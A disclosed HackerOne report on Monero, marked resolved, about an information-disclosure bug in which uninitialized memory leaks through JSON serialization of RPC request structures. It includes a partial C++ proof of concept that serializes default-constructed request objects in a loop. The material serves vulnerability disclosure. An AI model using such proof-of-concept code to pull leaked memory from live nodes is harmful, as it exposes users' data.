# [M] Monero can leak unitialized memory

## Summary
Severity: Medium
Program: Monero
Weakness: Information Disclosure
Reporter: guido
State: resolved
Disclosed: 2019-07-02T22:49:44.832Z
Source: https://hackerone.com/reports/481164

## Details
See this proof of concept:

```cpp
#include <net/http_client.h>
#include <rpc/core_rpc_server_commands_defs.h>
#include <storages/http_abstract_invoke.h>

INITIALIZE_EASYLOGGINGPP

template <class T>
static void invoke_http_json(void)
{
    typename T::request ireq;
    typename T::response ires;

    std::string req_param;
    if(!epee::serialization::store_t_to_json(ireq, req_param)) {
        return;
    }
    printf("%s\n", req_param.c_str());
}

int main(void)
{
    while ( true ) {
        const unsigned char which = rand() % 65;
        printf("which: %u\n", which);
        switch ( which ) {
            case 0:
                invoke_http_json<cryptonote::COMMAND_RPC_GET_HEIGHT>();
                break;

            case 1:
                invoke_http_json<cryptonote::COMMAND_RPC_GET_BLOCKS_FAST>();
                break;

            case 2:
                invoke_http_json<cryptonote::COMMAND_RPC_GET_BLOCKS_BY_HEIGHT>();
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/481164_
